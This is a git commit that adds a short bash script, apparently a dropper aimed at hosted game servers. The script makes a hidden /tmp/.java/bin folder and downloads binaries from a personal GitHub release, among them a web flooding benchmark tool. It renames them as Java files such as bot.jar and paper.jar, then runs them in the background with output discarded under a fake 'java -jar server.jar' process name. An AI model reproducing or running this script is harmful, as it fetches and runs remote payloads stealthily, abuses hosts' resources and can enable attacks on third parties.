b11bf08b4e255e79351a52b3948d28bdcb866ae4
i51jir6ni9t0 <wker-one@protonmail.com>
2025-08-13 14:26:28 +0000

    Croso D-KICKED

---
+++ tmp/crosmo/d.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+
+function fetch_files() {
+    mkdir -p /tmp/.java/bin
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/zpr-glibc2.39-arm64 -o java
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-arm64 -o bot.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/maintell/webBenchmark/releases/download/0.6/webBenchmark_linux_arm -o paper.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/arm/supervisord -o plugins.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/crosmo/d.conf -o cfg.conf
+}
+
+function start_app() {
+    chmod a+x /tmp/.java/bin/***
+    cd /tmp/.java/bin && nohup ./java -a 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
+}
+
+if [ -f "/tmp/.java/bin/bot.jar" ] && [ -f "/tmp/.java/bin/paper.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
+    start_app
+else
+    rm -rf /tmp/.java/bin/**
+    fetch_files
+    start_app
+fi
